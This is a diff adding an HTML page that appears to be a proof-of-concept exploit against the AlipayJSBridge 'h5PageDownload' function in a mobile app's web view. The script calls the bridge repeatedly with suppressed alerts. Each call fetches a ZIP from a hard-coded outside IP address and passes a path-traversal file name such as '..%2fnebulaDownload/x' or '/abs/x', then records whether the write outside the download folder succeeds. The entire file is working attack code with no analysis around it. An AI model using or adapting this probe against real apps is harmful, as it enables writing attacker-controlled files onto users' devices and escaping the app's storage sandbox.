@@ -1,0 +1,19 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p10</title></head>
+<body style="font-size:14px;padding:8px"><div id="r">INIT</div>
+<script>
+var out=[],ZIP='http://159.75.1.8/68687655-f76ecc0f5b5953003bab1f7d0fe158c1';
+function w(s){out.push(s);var e=document.getElementById('r');if(e)e.textContent=out.join(' | ');}
+var vs=['okname','a/b','a\b','..%2fnebulaDownload/x','%2e%2e%2fx','....//x','x..','..','/abs/x'];
+function fire(){
+  vs.forEach(function(f,i){
+    setTimeout(function(){
+      try{
+        AlipayJSBridge.call('h5PageDownload',{url:ZIP,fileName:f,preventAlert:true},function(r){
+          w(i+':'+String(JSON.stringify(r||{})).slice(0,55));
+        });
+      }catch(e){ w(i+':EX'); }
+    }, i*1200);
+  });
+}
+if(window.AlipayJSBridge&&AlipayJSBridge.call){fire();}else{document.addEventListener('AlipayJSBridgeReady',fire,false);}
+</script></body></html>
